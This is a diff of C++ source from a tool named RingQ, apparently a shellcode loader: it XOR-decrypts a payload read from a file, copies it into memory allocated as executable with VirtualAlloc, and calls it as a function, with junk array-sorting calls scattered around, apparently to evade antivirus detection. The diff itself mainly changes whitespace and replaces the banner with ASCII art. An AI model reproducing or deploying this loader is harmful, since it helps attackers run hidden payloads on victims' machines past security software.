@@ -129,7 +129,6 @@ void obfuscatedLogic() {
 }
 
 std::string xorDecrypt(const std::string& data, const std::string& key) {
-    generateAndSortArray();
 
     std::string decryptedData;
     for (std::size_t i = 0; i < data.length(); ++i) {
@@ -164,7 +163,7 @@ void quickSort(int arr[], int left, int right) {
 }
 
 int decryptKey(int diff, int minValue, int maxValue) {
-    
+
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<int> dis(minValue, maxValue);
@@ -176,8 +175,14 @@ int decryptKey(int diff, int minValue, int maxValue) {
 }
 
 void banner() {
-    cout << "               RingQ :)" << endl;
-    cout << "Github: https://github.com/T4y1oR/RingQ" << endl;
+    cout << "_____________               _______  " << endl;
+    cout << "___  __ \__(_)_____________ __  __ \ " << endl;;
+    cout << "__  /_/ /_  /__  __ \_  __ `/  / / / " << endl;
+    cout << "_  _, _/_  / _  / / /  /_/ // /_/ /  " << endl;
+    cout << "/_/ |_| /_/  /_/ /_/_\__, / \___\_\  " << endl;
+    cout << "                    /____/           " << endl;
+
+    cout << "Github: https://github.com/T4y1oR" << endl;
 }
 
 
@@ -241,6 +246,7 @@ void RingQ(const std::string& file_path) {
             const unsigned char* byte_sequence = reinterpret_cast<const unsigned char*>(decrypted_data.c_str());
             size_t byte_sequence_length = decrypted_data.length();
 
+
             LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
             generateAndSortArray();
@@ -252,11 +258,10 @@ void RingQ(const std::string& file_path) {
 
 
             ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
-             
+
             generateAndSortArray();
 
             shellcodeFunc();
-
 
             VirtualFree(execMemory, 0, MEM_RELEASE);
 
